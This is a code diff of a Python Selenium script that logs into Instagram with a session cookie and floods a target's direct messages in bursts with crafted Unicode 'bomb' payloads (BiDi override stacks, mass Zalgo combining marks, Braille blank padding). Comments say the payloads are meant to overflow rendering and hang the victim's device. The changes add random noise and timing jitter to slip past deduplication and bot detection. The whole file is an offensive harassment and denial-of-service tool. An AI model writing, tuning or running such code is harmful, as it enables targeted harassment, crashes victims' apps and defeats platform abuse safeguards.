@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (OBLIVION V2 - DEVEL KA ABBU)
-# 📅 STATUS: DENSITY x20 | BiDi-RECURSION | 10-BURST WAVE
+# 🚀 PROJECT: PRAVEER NC (STEALTH-OBLITERATOR)
+# 📅 STATUS: ANTI-FILTERING | DENSITY x20 | UNIQUE NOISE
 
 import os, time, random, threading, sys, gc, tempfile
 from concurrent.futures import ThreadPoolExecutor
@@ -13,29 +13,30 @@ THREADS = 2
 SESSION_LIMIT = 240 
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_oblivion_payload(target_name):
-    """The Oblivion Payload: Density x20 + BiDi Recursion."""
-    # 🌙 CUSTOM HEADER
-    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 SYSTEM_OBLIVION: [{target_name.upper()}]\n"
+def get_stealth_payload(target_name):
+    """Bypasses silent filters by adding unique noise and unique headers."""
+    # 💥 UNIQUE NOISE (Prevents server-side deduplication)
+    noise_id = "".join(random.choices("0123456789ABCDEF", k=10))
+    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n🆔 SESSION_REF: {noise_id}\n"
     
-    # 💥 THE 'DIRECTIONAL STACK' (15 layers of nested text direction)
-    bidi_recursion = "\u202E\u2066\u202D\u2067\u202B\u2068" * 15
+    # 💥 BiDi-RECURSION + VARIATION SELECTORS
+    # Using \ufe0f forces the browser to try and render color glyphs.
+    bidi_stack = "\u202E\u2066\u202D\u2067\u202B\u2068\ufe0f" * 8
     
-    # 💥 THE 'WIDTH-DISPLACER' (Braille Blanks + Non-Breaking Spaces)
-    width_bomb = "\u2800\u00A0" * 125 
-    
-    # 💥 DENSITY x20 (200 Zalgo marks per character)
-    # This forces the GPU Command Buffer to overflow instantly.
+    # 💥 DENSITY x20 (200 Zalgo marks)
     z_tower = "̸" * 200
     
-    lines = [header, width_bomb, bidi_recursion]
+    # 💥 WIDTH DISPLACER (Hidden Braille)
+    width_bomb = "\u2800\u00A0" * 110 
     
-    for i in range(75):
+    lines = [header, width_bomb]
+    
+    for i in range(60):
         prefix = "\u202E" if i % 2 == 0 else "\u202D"
-        # Forces Horizontal Overflow, Vertical Skyscraper, and BiDi Logic Hang
-        lines.append(f"{width_bomb}{prefix}{target_name.upper()}{z_tower}{bidi_recursion}")
+        # Combine everything into an unbreakable block
+        lines.append(f"{prefix}{target_name.upper()}{z_tower}{bidi_stack}")
     
-    return "\n".join(lines)[:9990]
+    return "\n".join(lines)[:9950]
 
 def get_driver(agent_id):
     chrome_options = Options()
@@ -51,21 +52,21 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
         try:
-            print(f"[M{MACHINE_ID}-A{agent_id}] 🌙 DEVEL KA ABBU DEPLOYED...", flush=True)
+            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ STEALTH MODE ACTIVE...", flush=True)
             driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
             driver.refresh()
-            time.sleep(7)
+            time.sleep(8)
             driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
             time.sleep(12)
 
             session_start = time.time()
             while (time.time() - session_start) < SESSION_LIMIT:
                 try:
-                    # 🔥 THE 10-BURST WAVE
-                    for _ in range(10):
-                        payload = get_oblivion_payload(target_name)
+                    # 🔥 THE 'JITTER' BURST (Bypasses Pattern Detection)
+                    for _ in range(8):
+                        payload = get_stealth_payload(target_name)
                         driver.execute_script("""
                             var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
                             if (box) {
@@ -80,10 +81,12 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
                                 }
                             }
                         """, payload)
-                        time.sleep(0.01) # Near-zero delay for the burst
+                        # Slightly slower delay (0.1s) is actually MORE effective for lag 
+                        # because it doesn't get dropped by the socket.
+                        time.sleep(random.uniform(0.1, 0.3)) 
                     
-                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 10-BURST IMPACT DELIVERED", flush=True)
-                    time.sleep(random.uniform(6, 10)) # Cooldown to prevent bot detection
+                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 WAVE LANDED", flush=True)
+                    time.sleep(random.uniform(5, 7)) 
                     
                 except:
                     time.sleep(5)
